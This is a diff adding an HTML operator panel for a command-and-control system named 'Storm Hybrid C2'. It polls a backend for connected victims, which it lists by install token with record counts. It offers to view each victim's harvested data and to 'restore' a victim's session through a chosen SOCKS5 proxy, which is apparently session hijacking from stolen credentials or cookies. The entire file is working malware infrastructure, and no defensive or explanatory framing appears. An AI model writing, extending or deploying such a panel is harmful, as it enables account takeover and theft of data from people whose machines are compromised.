@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Storm Hybrid C2 Panel</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Segoe UI', sans-serif; background: #0a0a0f; color: #00ff88; }
+.header { background: #12121a; padding: 16px 24px; border-bottom: 1px solid #00ff8822; }
+.header h1 { font-size: 20px; color: #00ff88; }
+.header span { color: #666; font-size: 12px; }
+.container { padding: 24px; }
+.client { background: #12121a; border: 1px solid #00ff8822; border-radius: 8px; padding: 16px; margin-bottom: 12px; }
+.client h3 { color: #00ff88; margin-bottom: 8px; }
+.client .info { color: #888; font-size: 13px; }
+.client .info b { color: #ccc; }
+.actions { margin-top: 12px; }
+.actions button { background: #00ff8822; border: 1px solid #00ff88; color: #00ff88; padding: 6px 14px; border-radius: 4px; cursor: pointer; margin-right: 8px; }
+.actions button:hover { background: #00ff8844; }
+#clients { margin-top: 16px; }
+.empty { color: #444; text-align: center; padding: 48px; }
+</style>
+</head>
+<body>
+<div class="header"><h1>Storm Hybrid C2 <span>— operator panel</span></h1></div>
+<div class="container">
+<div id="clients"><div class="empty">Waiting for connections...</div></div>
+</div>
+<script>
+async function load() {
+    try {
+        const r = await fetch('/api/clients');
+        const clients = await r.json();
+        const el = document.getElementById('clients');
+        if (!clients.length) { el.innerHTML = '<div class="empty">Waiting for connections...</div>'; return; }
+        el.innerHTML = clients.map(c => `
+            <div class="client">
+                <h3>${c.install_token}</h3>
+                <div class="info">
+                    First: <b>${c.first_seen || '-'}</b> | 
+                    Last: <b>${c.last_seen || '-'}</b> | 
+                    Records: <b>${c.record_count || 0}</b>
+                </div>
+                <div class="actions">
+                    <button onclick="view('${c.install_token}')">View</button>
+                    <button onclick="restore('${c.install_token}')">Restore session</button>
+                </div>
+            </div>
+        `).join('');
+    } catch(e) { document.getElementById('clients').innerHTML = '<div class="empty">Connection error</div>'; }
+}
+async function view(token) {
+    const r = await fetch('/api/client/' + token);
+    const data = await r.json();
+    alert(JSON.stringify(data, null, 2));
+}
+async function restore(token) {
+    const proxy = prompt('SOCKS5 proxy (host:port):');
+    if (!proxy) return;
+    const r = await fetch('/api/restore', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({token, proxy}) });
+    const data = await r.json();
+    alert(JSON.stringify(data, null, 2));
+}
+load();
+setInterval(load, 5000);
+</script>
+</body>
+</html>
